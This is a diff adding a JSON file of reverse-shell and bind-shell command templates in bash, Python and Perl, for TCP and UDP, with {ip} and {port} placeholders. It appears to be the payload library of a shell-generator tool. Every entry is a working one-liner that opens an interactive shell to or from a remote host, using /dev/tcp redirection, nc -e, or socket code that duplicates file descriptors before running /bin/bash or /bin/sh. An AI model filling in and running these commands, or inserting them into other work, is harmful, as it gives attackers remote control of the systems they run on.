@@ -1,0 +1,30 @@
+{
+    "bash": {
+        "reverse": {
+            "TCP": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
+            "UDP": "bash -i >& /dev/udp/{ip}/{port} 0>&1"
+        },
+        "bind": {
+            "TCP": "nc -lvp {port} -e /bin/bash",
+            "UDP": "nc -u -lvp {port} -e /bin/bash"
+        }
+    },
+    "python": {
+        "reverse": {
+            "TCP": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\"])'",
+            "UDP": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\"])'"
+        },
+        "bind": {
+            "TCP": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind((\"0.0.0.0\",{port}));s.listen(1);conn,addr=s.accept();[os.dup2(conn.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/bash\"])'"
+        }
+    },
+    "perl": {
+        "reverse": {
+            "TCP": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
+            "UDP": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_DGRAM,getprotobyname(\"udp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
+        },
+        "bind": {
+            "TCP": "perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,1);while(accept(C,S)){{open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");}};'"
+        }
+    }
+}
